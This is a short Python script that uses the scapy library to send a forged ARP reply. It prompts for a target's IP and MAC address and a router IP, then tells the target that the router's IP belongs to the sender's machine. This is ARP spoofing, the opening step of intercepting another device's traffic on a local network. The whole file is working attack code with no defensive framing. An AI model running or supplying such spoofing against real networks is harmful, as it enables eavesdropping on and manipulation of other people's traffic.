#!/usr/bin/env python 3
import scapy.all as scapy

target_ip = input("enter target ip:")
target_mac = input("enter target mac address: ")
router = input("router IP: ")


def create_packet(ip, mac, router_ip):
    packet = scapy.ARP(op=2, pdst=ip, hwdst=mac, psrc=router_ip)
    return packet


arp_packet = create_packet(target_ip, target_mac, router)
scapy.send(arp_packet)
